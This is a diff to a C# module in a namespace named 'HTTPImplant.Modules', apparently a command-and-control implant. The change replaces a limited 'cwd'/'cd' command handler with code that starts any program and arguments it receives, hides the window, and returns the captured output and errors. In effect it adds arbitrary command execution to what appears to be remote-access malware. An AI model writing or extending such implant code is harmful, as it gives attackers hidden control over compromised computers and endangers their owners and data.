@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Diagnostics;
 using System.Threading.Tasks;
 using System.Reflection.Emit;
 using System.IO;
@@ -26,19 +27,41 @@ namespace HTTPImplant.Modules
         static extern uint GetLastError();
         public static string command(string command, string args)
         {
-            string result;
-            switch (command)
+            string result = string.Empty;
+
+            try
             {
-                case "cwd":
-                    result = GetCurrentDir();
-                    break;
-                case "cd":
-                    result = SetCurrentDir(args);
-                    break;
-                default:
-                    result = "Command not found";
-                    break;
+                Console.WriteLine("Running: " + command + " With Args " + args);
+                ProcessStartInfo startInfo = new ProcessStartInfo
+                {
+                    FileName = command,
+                    Arguments = args,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                };
+
+                using (Process process = new Process { StartInfo = startInfo })
+                {
+                    process.Start();
+
+                    result = process.StandardOutput.ReadToEnd();
+                    string error = process.StandardError.ReadToEnd();
+
+                    process.WaitForExit();
+
+                    if (!string.IsNullOrEmpty(error))
+                    {
+                        result += "\nError: " + error;
+                    }
+                }
             }
+            catch (Exception ex)
+            {
+                result = "An error occurred: " + ex.Message;
+            }
+
             return result;
         }
         public static string GetCurrentDir()
